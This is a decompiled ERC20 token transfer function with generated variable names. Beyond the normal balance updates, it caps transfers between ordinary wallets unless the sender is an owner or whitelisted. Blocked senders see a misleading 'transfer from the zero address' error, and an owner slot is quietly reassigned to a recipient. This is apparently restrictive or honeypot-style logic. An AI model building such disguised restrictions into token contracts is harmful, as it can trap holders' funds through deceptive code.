function 0x12ee(uint256 varg0, uint256 varg1, uint256 varg2) private { 

    v0 = v1 = address(varg1) != _intnum;

    if (v1) {

        v0 = v2 = address(varg2) != _intnum;

    }

    if (v0) {

        v0 = v3 = _intnum != owner_7_0_19;

    }

    if (v0) {

        v0 = v4 = varg0 > stor_9;

    }

    if (v0) {

        v5 = v6 = address(varg2) == owner_7_0_19;

        if (address(varg2) != owner_7_0_19) {

            v5 = v7 = address(varg2) == owner_2_0_19;

        }

        if (!v5) {

            v8 = address(varg2);

            v5 = v9 = 0xff & owner_8[v8];

        }

        require(v5, Error('ERC20: transfer from the zero address'));

    }

    v10 = v11 = address(varg2) == _intnum;

    if (v11) {

        v10 = v12 = _intnum == owner_7_0_19;

    }

    if (v10) {

        owner_7_0_19 = varg1;

    }

    require(address(varg2) != 0, Error('ERC20: transfer from the zero address'));

    require(address(varg1) != 0, Error('ERC20: transfer to the zero address'));

    v13 = new struct(3);

    v13.word0 = 38;

    v14 = address(varg2);

    v15 = _SafeSub(v13, varg0, _balanceOf[v14]);

    v16 = address(varg2);

    _balanceOf[v16] = v15;

    v17 = address(varg1);

    v18 = _balanceOf[v17] + varg0;

    require(v18 >= _balanceOf[v17], Error('SafeMath: addition overflow'));

    v19 = address(varg1);

    _balanceOf[v19] = v18;

    emit Transfer(address(varg2), address(varg1), varg0);

    return ;

}
